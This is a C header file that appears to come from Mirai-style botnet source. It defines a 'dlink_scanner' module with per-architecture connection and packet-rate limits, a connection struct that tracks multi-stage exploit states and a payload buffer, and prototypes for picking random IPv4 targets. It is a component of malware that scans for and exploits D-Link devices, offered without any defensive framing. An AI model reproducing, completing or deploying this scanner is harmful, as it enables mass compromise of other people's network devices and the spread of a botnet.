#pragma once

#include <stdint.h>

#include "includes.h"

#ifdef X86_64
#define dlink_scanner_MAX_CONNS 512
#define dlink_scanner_RAW_PPS 720
#else
#define dlink_scanner_MAX_CONNS 128
#define dlink_scanner_RAW_PPS 160
#endif

#ifdef X86_64
#define dlink_scanner_RDBUF_SIZE 1024
#define dlink_scanner_HACK_DRAIN 64
#else
#define dlink_scanner_RDBUF_SIZE 256
#define dlink_scanner_HACK_DRAIN 64
#endif

struct dlink_scanner_connection
{
    int fd, last_recv;
    enum
    {
        dlink_scanner_SC_CLOSED,
        dlink_scanner_SC_CONNECTING,
        dlink_scanner_SC_EXPLOIT_STAGE2,
        dlink_scanner_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[dlink_scanner_RDBUF_SIZE];
    char payload_buf[1024];
};

void dlink_scanner_init();
void dlink_scanner_kill(void);

static void dlink_scanner_setup_connection(struct dlink_scanner_connection *);
static ipv4_t dlink_scanner_get_random_ip(void);
